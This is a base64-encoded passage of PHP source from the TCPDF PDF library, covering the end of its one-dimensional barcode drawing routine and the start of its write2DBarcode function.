3BhZGRpbmcnXSA9PT0gJ2F1dG8nKSB7CgkJCSRwYWRkaW5nID0gMTAgKiAoJHcgLyAoJGFycmNvZGVbJ21heHcnXSArIDIwKSk7CgkJfSBlbHNlIHsKCQkJJHBhZGRpbmcgPSBmbG9hdHZhbCgkc3R5bGVbJ3BhZGRpbmcnXSk7CgkJfQoJCS8vIGhvcml6b250YWwgcGFkZGluZwoJCWlmICghaXNzZXQoJHN0eWxlWydocGFkZGluZyddKSkgewoJCQkkaHBhZGRpbmcgPSAkcGFkZGluZzsKCQl9IGVsc2VpZiAoJHN0eWxlWydocGFkZGluZyddID09PSAnYXV0bycpIHsKCQkJJGhwYWRkaW5nID0gMTAgKiAoJHcgLyAoJGFycmNvZGVbJ21heHcnXSArIDIwKSk7CgkJfSBlbHNlIHsKCQkJJGhwYWRkaW5nID0gZmxvYXR2YWwoJHN0eWxlWydocGFkZGluZyddKTsKCQl9CgkJLy8gdmVydGljYWwgcGFkZGluZwoJCWlmICghaXNzZXQoJHN0eWxlWyd2cGFkZGluZyddKSkgewoJCQkkdnBhZGRpbmcgPSAkcGFkZGluZzsKCQl9IGVsc2VpZiAoJHN0eWxlWyd2cGFkZGluZyddID09PSAnYXV0bycpIHsKCQkJJHZwYWRkaW5nID0gKCRocGFkZGluZyAvIDIpOwoJCX0gZWxzZSB7CgkJCSR2cGFkZGluZyA9IGZsb2F0dmFsKCRzdHlsZVsndnBhZGRpbmcnXSk7CgkJfQoJCS8vIGNhbGN1bGF0ZSB4cmVzIChzaW5nbGUgYmFyIHdpZHRoKQoJCSRtYXhfeHJlcyA9ICgkdyAtICgyICogJGhwYWRkaW5nKSkgLyAkYXJyY29kZVsnbWF4dyddOwoJCWlmICgkc3R5bGVbJ3N0cmV0Y2gnXSkgewoJCQkkeHJlcyA9ICRtYXhfeHJlczsKCQl9IGVsc2UgewoJCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHhyZXMpKSB7CgkJCQkkeHJlcyA9ICgwLjE0MSAqICR0aGlzLT5rKTsgLy8gZGVmYXVsdCBiYXIgd2lkdGggPSAwLjQgbW0KCQkJfQoJCQlpZiAoJHhyZXMgPiAkbWF4X3hyZXMpIHsKCQkJCS8vIGNvcnJlY3QgeHJlcyB0byBmaXQgb24gJHcKCQkJCSR4cmVzID0gJG1heF94cmVzOwoJCQl9CgkJCWlmICgoaXNzZXQoJHN0eWxlWydwYWRkaW5nJ10pIEFORCAoJHN0eWxlWydwYWRkaW5nJ10gPT09ICdhdXRvJykpCgkJCQlPUiAoaXNzZXQoJHN0eWxlWydocGFkZGluZyddKSBBTkQgKCRzdHlsZVsnaHBhZGRpbmcnXSA9PT0gJ2F1dG8nKSkpIHsKCQkJCSRocGFkZGluZyA9IDEwICogJHhyZXM7CgkJCQlpZiAoaXNzZXQoJHN0eWxlWyd2cGFkZGluZyddKSBBTkQgKCRzdHlsZVsndnBhZGRpbmcnXSA9PT0gJ2F1dG8nKSkgewoJCQkJCSR2cGFkZGluZyA9ICgkaHBhZGRpbmcgLyAyKTsKCQkJCX0KCQkJfQoJCX0KCQlpZiAoJHN0eWxlWydmaXR3aWR0aCddKSB7CgkJCSR3b2xkID0gJHc7CgkJCSR3ID0gKCgkYXJyY29kZVsnbWF4dyddICogJHhyZXMpICsgKDIgKiAkaHBhZGRpbmcpKTsKCQkJaWYgKGlzc2V0KCRzdHlsZVsnY2VsbGZpdGFsaWduJ10pKSB7CgkJCQlzd2l0Y2ggKCRzdHlsZVsnY2VsbGZpdGFsaWduJ10pIHsKCQkJCQljYXNlICdMJzogewoJCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkJJHggLT0gKCR3b2xkIC0gJHcpOwoJCQkJCQl9CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdSJzogewoJCQkJCQlpZiAoISR0aGlzLT5ydGwpIHsKCQkJCQkJCSR4ICs9ICgkd29sZCAtICR3KTsKCQkJCQkJfQoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAnQyc6IHsKCQkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCSR4IC09ICgoJHdvbGQgLSAkdykgLyAyKTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSR4ICs9ICgoJHdvbGQgLSAkdykgLyAyKTsKCQkJCQkJfQoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJZGVmYXVsdCA6IHsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJCSR0ZXh0X2hlaWdodCA9ICR0aGlzLT5nZXRDZWxsSGVpZ2h0KCRmb250c2l6ZSAvICR0aGlzLT5rKTsKCQkvLyBoZWlnaHQKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGgpIE9SICgkaCA8PSAwKSkgewoJCQkvLyBzZXQgZGVmYXVsdCBoZWlnaHQKCQkJJGggPSAoKCRhcnJjb2RlWydtYXh3J10gKiAkeHJlcykgLyAzKSArICgyICogJHZwYWRkaW5nKSArICR0ZXh0X2hlaWdodDsKCQl9CgkJJGJhcmggPSAkaCAtICR0ZXh0X2hlaWdodCAtICgyICogJHZwYWRkaW5nKTsKCQlpZiAoJGJhcmggPD0wKSB7CgkJCS8vIHRyeSB0byByZWR1Y2UgZm9udCBvciBwYWRkaW5nIHRvIGZpdCBiYXJjb2RlIG9uIGF2YWlsYWJsZSBoZWlnaHQKCQkJaWYgKCR0ZXh0X2hlaWdodCA+ICRoKSB7CgkJCQkkZm9udHNpemUgPSAoKCRoICogJHRoaXMtPmspIC8gKDQgKiAkdGhpcy0+Y2VsbF9oZWlnaHRfcmF0aW8pKTsKCQkJCSR0ZXh0X2hlaWdodCA9ICR0aGlzLT5nZXRDZWxsSGVpZ2h0KCRmb250c2l6ZSAvICR0aGlzLT5rKTsKCQkJCSR0aGlzLT5zZXRGb250KCRzdHlsZVsnZm9udCddLCAnJywgJGZvbnRzaXplKTsKCQkJfQoJCQlpZiAoJHZwYWRkaW5nID4gMCkgewoJCQkJJHZwYWRkaW5nID0gKCgkaCAtICR0ZXh0X2hlaWdodCkgLyA0KTsKCQkJfQoJCQkkYmFyaCA9ICRoIC0gJHRleHRfaGVpZ2h0IC0gKDIgKiAkdnBhZGRpbmcpOwoJCX0KCQkvLyBmaXQgdGhlIGJhcmNvZGUgb24gYXZhaWxhYmxlIHNwYWNlCgkJbGlzdCgkdywgJGgsICR4LCAkeSkgPSAkdGhpcy0+Zml0QmxvY2soJHcsICRoLCAkeCwgJHksIGZhbHNlKTsKCQkvLyBzZXQgYWxpZ25tZW50CgkJJHRoaXMtPmltZ19yYl95ID0gJHkgKyAkaDsKCQkvLyBzZXQgYWxpZ25tZW50CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJaWYgKCRzdHlsZVsncG9zaXRpb24nXSA9PSAnTCcpIHsKCQkJCSR4cG9zID0gJHRoaXMtPmxNYXJnaW47CgkJCX0gZWxzZWlmICgkc3R5bGVbJ3Bvc2l0aW9uJ10gPT0gJ0MnKSB7CgkJCQkkeHBvcyA9ICgkdGhpcy0+dyArICR0aGlzLT5sTWFyZ2luIC0gJHRoaXMtPnJNYXJnaW4gLSAkdykgLyAyOwoJCQl9IGVsc2VpZiAoJHN0eWxlWydwb3NpdGlvbiddID09ICdSJykgewoJCQkJJHhwb3MgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeHBvcyA9ICR4IC0gJHc7CgkJCX0KCQkJJHRoaXMtPmltZ19yYl94ID0gJHhwb3M7CgkJfSBlbHNlIHsKCQkJaWYgKCRzdHlsZVsncG9zaXRpb24nXSA9PSAnTCcpIHsKCQkJCSR4cG9zID0gJHRoaXMtPmxNYXJnaW47CgkJCX0gZWxzZWlmICgkc3R5bGVbJ3Bvc2l0aW9uJ10gPT0gJ0MnKSB7CgkJCQkkeHBvcyA9ICgkdGhpcy0+dyArICR0aGlzLT5sTWFyZ2luIC0gJHRoaXMtPnJNYXJnaW4gLSAkdykgLyAyOwoJCQl9IGVsc2VpZiAoJHN0eWxlWydwb3NpdGlvbiddID09ICdSJykgewoJCQkJJHhwb3MgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeHBvcyA9ICR4OwoJCQl9CgkJCSR0aGlzLT5pbWdfcmJfeCA9ICR4cG9zICsgJHc7CgkJfQoJCSR4cG9zX3JlY3QgPSAkeHBvczsKCQlpZiAoIWlzc2V0KCRzdHlsZVsnYWxpZ24nXSkpIHsKCQkJJHN0eWxlWydhbGlnbiddID0gJ0MnOwoJCX0KCQlzd2l0Y2ggKCRzdHlsZVsnYWxpZ24nXSkgewoJCQljYXNlICdMJzogewoJCQkJJHhwb3MgPSAkeHBvc19yZWN0ICsgJGhwYWRkaW5nOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnUic6IHsKCQkJCSR4cG9zID0gJHhwb3NfcmVjdCArICgkdyAtICgkYXJyY29kZVsnbWF4dyddICogJHhyZXMpKSAtICRocGFkZGluZzsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ0MnOgoJCQlkZWZhdWx0IDogewoJCQkJJHhwb3MgPSAkeHBvc19yZWN0ICsgKCgkdyAtICgkYXJyY29kZVsnbWF4dyddICogJHhyZXMpKSAvIDIpOwoJCQkJYnJlYWs7CgkJCX0KCQl9CgkJJHhwb3NfdGV4dCA9ICR4cG9zOwoJCS8vIGJhcmNvZGUgaXMgYWx3YXlzIHByaW50ZWQgaW4gTFRSIGRpcmVjdGlvbgoJCSR0ZW1wUlRMID0gJHRoaXMtPnJ0bDsKCQkkdGhpcy0+cnRsID0gZmFsc2U7CgkJLy8gcHJpbnQgYmFja2dyb3VuZCBjb2xvcgoJCWlmICgkc3R5bGVbJ2JnY29sb3InXSkgewoJCQkkdGhpcy0+UmVjdCgkeHBvc19yZWN0LCAkeSwgJHcsICRoLCAkc3R5bGVbJ2JvcmRlciddID8gJ0RGJyA6ICdGJywgJycsICRzdHlsZVsnYmdjb2xvciddKTsKCQl9IGVsc2VpZiAoJHN0eWxlWydib3JkZXInXSkgewoJCQkkdGhpcy0+UmVjdCgkeHBvc19yZWN0LCAkeSwgJHcsICRoLCAnRCcpOwoJCX0KCQkvLyBzZXQgZm9yZWdyb3VuZCBjb2xvcgoJCSR0aGlzLT5zZXREcmF3Q29sb3JBcnJheSgkc3R5bGVbJ2ZnY29sb3InXSk7CgkJJHRoaXMtPnNldFRleHRDb2xvckFycmF5KCRzdHlsZVsnZmdjb2xvciddKTsKCQkvLyBwcmludCBiYXJzCgkJZm9yZWFjaCAoJGFycmNvZGVbJ2Jjb2RlJ10gYXMgJGsgPT4gJHYpIHsKCQkJJGJ3ID0gKCR2Wyd3J10gKiAkeHJlcyk7CgkJCWlmICgkdlsndCddKSB7CgkJCQkvLyBkcmF3IGEgdmVydGljYWwgYmFyCgkJCQkkeXBvcyA9ICR5ICsgJHZwYWRkaW5nICsgKCR2WydwJ10gKiAkYmFyaCAvICRhcnJjb2RlWydtYXhoJ10pOwoJCQkJJHRoaXMtPlJlY3QoJHhwb3MsICR5cG9zLCAkYncsICgkdlsnaCddICogJGJhcmggLyAkYXJyY29kZVsnbWF4aCddKSwgJ0YnLCBhcnJheSgpLCAkc3R5bGVbJ2ZnY29sb3InXSk7CgkJCX0KCQkJJHhwb3MgKz0gJGJ3OwoJCX0KCQkvLyBwcmludCB0ZXh0CgkJaWYgKCRzdHlsZVsndGV4dCddKSB7CgkJCWlmIChpc3NldCgkc3R5bGVbJ2xhYmVsJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHN0eWxlWydsYWJlbCddKSkgewoJCQkJJGxhYmVsID0gJHN0eWxlWydsYWJlbCddOwoJCQl9IGVsc2UgewoJCQkJJGxhYmVsID0gJGNvZGU7CgkJCX0KCQkJJHR4dHdpZHRoID0gKCRhcnJjb2RlWydtYXh3J10gKiAkeHJlcyk7CgkJCWlmICgkdGhpcy0+R2V0U3RyaW5nV2lkdGgoJGxhYmVsKSA+ICR0eHR3aWR0aCkgewoJCQkJJHN0eWxlWydzdHJldGNodGV4dCddID0gMjsKCQkJfQoJCQkvLyBwcmludCB0ZXh0CgkJCSR0aGlzLT54ID0gJHhwb3NfdGV4dDsKCQkJJHRoaXMtPnkgPSAkeSArICR2cGFkZGluZyArICRiYXJoOwoJCQkkY2VsbHBhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nOwoJCQkkdGhpcy0+c2V0Q2VsbFBhZGRpbmcoMCk7CgkJCSR0aGlzLT5DZWxsKCR0eHR3aWR0aCwgMCwgJGxhYmVsLCAwLCAwLCAnQycsIGZhbHNlLCAnJywgJHN0eWxlWydzdHJldGNodGV4dCddLCBmYWxzZSwgJ1QnLCAnVCcpOwoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJGNlbGxwYWRkaW5nOwoJCX0KCQkvLyByZXN0b3JlIG9yaWdpbmFsIGRpcmVjdGlvbgoJCSR0aGlzLT5ydGwgPSAkdGVtcFJUTDsKCQkvLyByZXN0b3JlIHByZXZpb3VzIHNldHRpbmdzCgkJJHRoaXMtPnNldEdyYXBoaWNWYXJzKCRndmFycyk7CgkJLy8gc2V0IHBvaW50ZXIgdG8gYWxpZ24gdGhlIG5leHQgdGV4dC9vYmplY3RzCgkJc3dpdGNoKCRhbGlnbikgewoJCQljYXNlICdUJzp7CgkJCQkkdGhpcy0+eSA9ICR5OwoJCQkJJHRoaXMtPnggPSAkdGhpcy0+aW1nX3JiX3g7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdNJzp7CgkJCQkkdGhpcy0+eSA9ICR5ICsgcm91bmQoJGggLyAyKTsKCQkJCSR0aGlzLT54ID0gJHRoaXMtPmltZ19yYl94OwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnQic6ewoJCQkJJHRoaXMtPnkgPSAkdGhpcy0+aW1nX3JiX3k7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ04nOnsKCQkJCSR0aGlzLT5zZXRZKCR0aGlzLT5pbWdfcmJfeSk7CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OnsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5lbmRsaW5leCA9ICR0aGlzLT5pbWdfcmJfeDsKCX0KCgkvKioKCSAqIFByaW50IDJEIEJhcmNvZGUuCgkgKiBAcGFyYW0gc3RyaW5nICRjb2RlIGNvZGUgdG8gcHJpbnQKCSAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgdHlwZSBvZiBiYXJjb2RlIChzZWUgdGNwZGZfYmFyY29kZXNfMmQucGhwIGZvciBzdXBwb3J0ZWQgZm9ybWF0cykuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCB4IHBvc2l0aW9uIGluIHVzZXIgdW5pdHMKCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IHkgcG9zaXRpb24gaW4gdXNlciB1bml0cwoJICogQHBhcmFtIGZsb2F0fG51bGwgJHcgd2lkdGggaW4gdXNlciB1bml0cwoJICogQHBhcmFtIGZsb2F0fG51bGwgJGggaGVpZ2h0IGluIHVzZXIgdW5pdHMKCSAqIEBwYXJhbSBhcnJheSAkc3R5bGUgYXJyYXkgb2Ygb3B0aW9uczo8dWw+CgkgKiA8bGk+Ym9vbGVhbiAkc3R5bGVbJ2JvcmRlciddIGlmIHRydWUgcHJpbnRzIGEgYm9yZGVyIGFyb3VuZCB0aGUgYmFyY29kZTwvbGk+CgkgKiA8bGk+aW50ICRzdHlsZVsncGFkZGluZyddIHBhZGRpbmcgdG8gbGVhdmUgYXJvdW5kIHRoZSBiYXJjb2RlIGluIGJhcmNvZGUgdW5pdHMgKHNldCB0byAnYXV0bycgZm9yIGF1dG9tYXRpYyBwYWRkaW5nKTwvbGk+CgkgKiA8bGk+aW50ICRzdHlsZVsnaHBhZGRpbmcnXSBob3Jpem9udGFsIHBhZGRpbmcgaW4gYmFyY29kZSB1bml0cyAoc2V0IHRvICdhdXRvJyBmb3IgYXV0b21hdGljIHBhZGRpbmcpPC9saT4KCSAqIDxsaT5pbnQgJHN0eWxlWyd2cGFkZGluZyddIHZlcnRpY2FsIHBhZGRpbmcgaW4gYmFyY29kZSB1bml0cyAoc2V0IHRvICdhdXRvJyBmb3IgYXV0b21hdGljIHBhZGRpbmcpPC9saT4KCSAqIDxsaT5pbnQgJHN0eWxlWydtb2R1bGVfd2lkdGgnXSB3aWR0aCBvZiBhIHNpbmdsZSBtb2R1bGUgaW4gcG9pbnRzPC9saT4KCSAqIDxsaT5pbnQgJHN0eWxlWydtb2R1bGVfaGVpZ2h0J10gaGVpZ2h0IG9mIGEgc2luZ2xlIG1vZHVsZSBpbiBwb2ludHM8L2xpPgoJICogPGxpPmFycmF5ICRzdHlsZVsnZmdjb2xvciddIGNvbG9yIGFycmF5IGZvciBiYXJzIGFuZCB0ZXh0PC9saT4KCSAqIDxsaT5taXhlZCAkc3R5bGVbJ2JnY29sb3InXSBjb2xvciBhcnJheSBmb3IgYmFja2dyb3VuZCBvciBmYWxzZSBmb3IgdHJhbnNwYXJlbnQ8L2xpPgoJICogPGxpPnN0cmluZyAkc3R5bGVbJ3Bvc2l0aW9uJ10gYmFyY29kZSBwb3NpdGlvbiBvbiB0aGUgcGFnZTogTCA9IGxlZnQgbWFyZ2luOyBDID0gY2VudGVyOyBSID0gcmlnaHQgbWFyZ2luOyBTID0gc3RyZXRjaDwvbGk+CgkgKiBAcGFyYW0gc3RyaW5nICRhbGlnbiBJbmRpY2F0ZXMgdGhlIGFsaWdubWVudCBvZiB0aGUgcG9pbnRlciBuZXh0IHRvIGJhcmNvZGUgaW5zZXJ0aW9uIHJlbGF0aXZlIHRvIGJhcmNvZGUgaGVpZ2h0LiBUaGUgdmFsdWUgY2FuIGJlOjx1bD48bGk+VDogdG9wLXJpZ2h0IGZvciBMVFIgb3IgdG9wLWxlZnQgZm9yIFJUTDwvbGk+PGxpPk06IG1pZGRsZS1yaWdodCBmb3IgTFRSIG9yIG1pZGRsZS1sZWZ0IGZvciBSVEw8L2xpPjxsaT5COiBib3R0b20tcmlnaHQgZm9yIExUUiBvciBib3R0b20tbGVmdCBmb3IgUlRMPC9saT48bGk+TjogbmV4dCBsaW5lPC9saT48L3VsPgoJICogQHBhcmFtIGJvb2xlYW4gJGRpc3RvcnQgaWYgdHJ1ZSBkaXN0b3J0IHRoZSBiYXJjb2RlIHRvIGZpdCB3aWR0aCBhbmQgaGVpZ2h0LCBvdGhlcndpc2UgcHJlc2VydmUgYXNwZWN0IHJhdGlvCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDQuNS4wMzcgKDIwMDktMDQtMDcpCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiB3cml0ZTJEQmFyY29kZSgkY29kZSwgJHR5cGUsICR4PW51bGwsICR5PW51bGwsICR3PW51bGwsICRoPW51bGwsICRzdHlsZT1hcnJheSgpLCAkYWxpZ249JycsICRkaXN0b3J0PWZhbHNlKSB7CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKHRyaW0oJGNvZGUpKSkgewoJCQlyZXR1cm47CgkJfQoJCXJlcXVpcmVfb25jZShkaXJuYW1lKF9fRklMRV9fKS4nL3RjcGRmX2JhcmNvZGVzXzJkLnBocCcpOwoJCS8vIHNhdmUgY3VycmVudCBncmFwaGljIHNldHRpbmdzCgkJJGd2YXJzID0gJHRoaXMtPmdldEdyYXBoaWNWYXJzKCk7CgkJLy8gY3JlYXRlIG5ldyBiYXJjb2RlIG9iamVjdAoJCSRiYXJjb2Rlb2JqID0gbmV3IFRDUERGMkRCYXJjb2RlKCRjb2RlLCAkdHlwZSk7CgkJJGFycmNvZGUgPSAkYmFyY29kZW9iai0+Z2V0QmFyY29kZUFycmF5KCk7CgkJaWYgKGVtcHR5KCRhcnJjb2RlKSBPUiAhaXNzZXQoJGFycmNvZGVbJ251bV9yb3dzJ10pIE9SICgkYXJyY29kZVsnbnVtX3Jvd3MnXSA9PSAwKSBPUiAhaXNzZXQoJGFycmNvZGVbJ251bV9jb2xzJ10pIE9SICgkYXJyY29kZVsnbnVtX2NvbHMnXSA9PSAwKSkgewoJCQkkdGhpcy0+RXJyb3IoJ0Vycm9yIGluIDJEIGJhcmNvZGUgc3RyaW5nJyk7CgkJfQoJCS8vIHNldCBkZWZhdWx0IHZhbHVlcwoJCWlmICghaXNzZXQoJHN0eWxlWydwb3NpdGlvbiddKSkgewoJCQkkc3R5bGVbJ3Bvc2l0aW9uJ10gPSAnJzsKCQl9CgkJaWYgKCFpc3NldCgkc3R5bGVbJ2ZnY29sb3InXSkpIHsKCQkJJHN0eWxlWydmZ2NvbG9yJ10gPSBhcnJheSgwLDAsMCk7IC8vIGRlZmF1bHQgYmxhY2sKCQl9CgkJaWYgKCFpc3NldCgkc3R5bGVbJ2JnY29sb3InXSkpIHsKCQkJJHN0eWxlWydiZ2NvbG9yJ10gPSBmYWxzZTsgLy8gZGVmYXVsdCB0cmFuc3BhcmVudAoJCX0KCQlpZiAoIWlzc2V0KCRzdHlsZVsnYm9yZGVyJ10pKSB7CgkJCSRzdHlsZVsnYm9yZGVyJ10gPSBmYWxzZTsKCQl9CgkJLy8gcGFkZGluZwoJCWlmICghaXNzZXQoJHN0eWxlWydwYWRkaW5nJ10pKSB7CgkJCSRzdHlsZVsncGFkZGluZyddID0gMDsKCQl9IGVsc2VpZiAoJHN0eWxlWydwYWRkaW5nJ10gPT09ICdhdXRvJykgewoJCQkkc3R5bGVbJ3BhZGRpbmcnXSA9IDQ7CgkJfQoJCWlmICghaXNzZXQoJHN0eWxlWydocGFkZGluZyddKSkgewoJCQkkc3R5bGVbJ2hwYWRkaW5nJ10gPSAkc3R5bGVbJ3BhZGRpbmcnXTsKCQl9IGVsc2VpZiAoJHN0eWxlWydocGFkZGluZyddID09PSAnYXV0bycpIHsKCQkJJHN0eWxlWydocGFkZGluZyddID0gNDsKCQl9CgkJaWYgKCFpc3NldCgkc3R5bGVbJ3ZwYWRkaW5nJ10pKSB7CgkJCSRzdHlsZVsndnBhZGRpbmcnXSA9ICRzdHlsZVsncGFkZGluZyddOwoJCX0gZWxzZWlmICgkc3R5bGVbJ3ZwYWRkaW5nJ10gPT09ICdhdXRvJykgewoJCQkkc3R5bGVbJ3ZwYWRkaW5nJ10gPSA0OwoJCX0KCQkkaHBhZCA9ICgyICogJHN0eWxlWydocGFkZGluZyddKTsKCQkkdnBhZCA9ICgyICogJHN0eWxlWyd2cGFkZGluZyddKTsKCQkvLyBjZWxsIChtb2R1bGUpIGRpbWVuc2lvbgoJCWlmICghaXNzZXQoJHN0eWxlWydtb2R1bGVfd2lkdGgnXSkpIHsKCQkJJHN0eWxlWydtb2R1bGVfd2lkdGgnXSA9IDE7IC8vIHdpZHRoIG9mIGEgc2luZ2xlIG1vZHVsZSBpbiBwb2ludHMKCQl9CgkJaWYgKCFpc3NldCgkc3R5bGVbJ21vZHVsZV9oZWlnaHQnXSkpIHsKCQkJJHN0eWxlWydtb2R1bGVfaGVpZ2h0J10gPSAxOyAvLyBoZWlnaHQgb2YgYSBzaW5nbGUgbW9kdWxlIGluIHBvaW50cwoJCX0KCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHgsICR5KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpOwoJCS8vIG51bWJlciBvZiBiYXJjb2RlIGNvbHVtbnMgYW5kIHJvd3MKCQkkcm93cyA9ICRhcnJjb2RlWydudW1fcm93cyddOwoJCSRjb2xzID0gJGFycmNvZGVbJ251bV9jb2xzJ107CgkJaWYgKCgkcm93cyA8PSAwKSB8fCAoJGNvbHMgPD0gMCkpewoJCQkkdGhpcy0+RXJyb3IoJ0Vycm9yIGluIDJEIGJhcmNvZGUgc3RyaW5nJyk7CgkJfQoJCS8vIG1vZHVsZSB3aWR0aCBhbmQgaGVpZ2h0CgkJJG13ID0gJHN0eWxlWydtb2R1bGVfd2lkdGgnXTsKCQkkbWggPSAkc3R5bGVbJ21vZHVsZV9oZWlnaHQnXTsKCQlpZiAoKCRtdyA8PSAwKSBPUiAoJG1oIDw9IDApKSB7CgkJCSR0aGlzLT5FcnJvcignRXJyb3IgaW4gMkQgYmFyY29kZSBzdHJpbmcnKTsKCQl9CgkJLy8gZ2V0IG1heCBkaW1lbnNpb25zCgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJG1heHcgPSAkeCAtICR0aGlzLT5sTWFyZ2luOwoJCX0gZWxzZSB7CgkJCSRtYXh3ID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbiAtICR4OwoJCX0KCQkkbWF4aCA9ICgkdGhpcy0+aCAtICR0aGlzLT50TWFyZ2luIC0gJHRoaXMtPmJNYXJnaW4pOwoJCSRyYXRpb0hXID0gKCgoJHJvd3MgKiAkbWgpICsgJGhwYWQpIC8gKCgkY29scyAqICRtdykgKyAkdnBhZCkpOwoJCSRyYXRpb1dIID0gKCgoJGNvbHMgKiAkbXcpICsgJHZwYWQpIC8gKCgkcm93cyAqICRtaCkgKyAkaHBhZCkpOwoJCWlmICghJGRpc3RvcnQpIHsKCQkJaWYgKCgkbWF4dyAqICRyYXRpb0hXKSA+ICRtYXhoKSB7CgkJCQkkbWF4dyA9ICRtYXhoICogJHJhdGlvV0g7CgkJCX0KCQkJaWYgKCgkbWF4aCAqICRyYXRpb1dIKSA+ICRtYXh3KSB7CgkJCQkkbWF4aCA9ICRtYXh3ICogJHJhdGlvSFc7CgkJCX0KCQl9CgkJLy8gc2V0IG1heGltdW0gZGltZW5zaW9ucwoJCWlmICgkdyA+ICRtYXh3KSB7CgkJCSR3ID0gJG1heHc7CgkJfQoJCWlmICgkaCA+ICRtYXhoKSB7CgkJCSRoID0gJG1heGg7CgkJfQoJCS8vIHNldCBkaW1lbnNpb25zCgkJaWYgKChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdykgT1IgKCR3IDw9IDApKSBBTkQgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRoKSBPUiAoJGggPD0gMCkpKSB7CgkJCSR3ID0gKCRjb2xzICsgJGhwYWQpICogKCRtdyAvICR0aGlzLT5rKTsKCQkJJGggPSAoJHJvd3MgKyAkdnBhZCkgKiAoJG1oIC8gJHRoaXMtPmspOwoJCX0gZWxzZWlmICgoJHcgPT09ICcnKSBPUiAoJHcgPD0gMCkpIHsKCQkJJHcgPSAkaCAqICRyYXRpb1dIOwoJCX0gZWxzZWlmICgoJGggPT09ICcnKSBPUiAoJGggPD0gMCkpIHsKCQkJJGggPSAkdyAqICRyYXRpb0hXOwoJCX0KCQkvLyBiYXJjb2RlIHNpemUgKGV4Y2x1ZGluZyBwYWRkaW5nKQoJCSRidyA9ICgkdyAqICRjb2xzKSAvICgkY29scyArICRocGFkKTsKCQkkYmggPSAoJGggKiAkcm93cykgLyAoJHJvd3MgKyAkdnBhZCk7CgkJLy8gZGltZW5zaW9uIG9mIHNpbmdsZSBiYXJjb2RlIGNlbGwgdW5pdAoJCSRjdyA9ICRidyAvICRjb2xzOwoJCSRjaCA9ICRiaCAvICRyb3dzOwoJCWlmICghJGRpc3RvcnQpIHsKCQkJaWYgKCgkY3cgLyAkY2gpID4gKCRtdyAvICRtaCkpIHsKCQkJCS8vIGNvcnJlY3QgaG9yaXpvbnRhbCBkaXN0b3J0aW9uCgkJCQkkY3cgPSAkY2ggKiAkbXcgLyAkbWg7CgkJCQkkYncgPSAkY3cgKiAkY29sczsKCQkJCSRzdHlsZVsnaHBhZGRpbmcnXSA9ICgkdyAtICRidykgLyAoMiAqICRjdyk7CgkJCX0gZWxzZSB7CgkJCQkvLyBjb3JyZWN0IHZlcnRpY2FsIGRpc3RvcnRpb24KCQkJCSRjaCA9ICRjdyAqICRtaCAvICRtdzsKCQkJCSRiaCA9ICRjaCAqICRyb3dzOwoJCQkJJHN0eWxlWyd2cGFkZGluZyddID0gKCRoIC0gJGJoKSAvICgyICogJGNoKTsKCQkJfQoJCX0KCQkvLyBmaXQgdGhlIGJhcmNvZGUgb24gYXZhaWxhYmxlIHNwYWNlCgkJbGlzdCgkdywgJGgsICR4LCAkeSkgPSAkdGhpcy0+Zml0QmxvY2soJHcsICRoLCAkeCwgJHksIGZhbHNlKTsKCQkvLyBzZXQgYWxpZ25tZW50CgkJJHRoaXMtPmltZ19yYl95ID0gJHkgKyAkaDsKCQkvLyBzZXQgYWxpZ25tZW50CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJaWYgKCRzdHlsZVsncG9zaXRpb24nXSA9PSAnTCcpIHsKCQkJCSR4cG9zID0gJHRoaXMtPmxNYXJnaW47CgkJCX0gZWxzZWlmICgkc3R5bGVbJ3Bvc2l0aW9uJ10gPT0gJ0MnKSB7C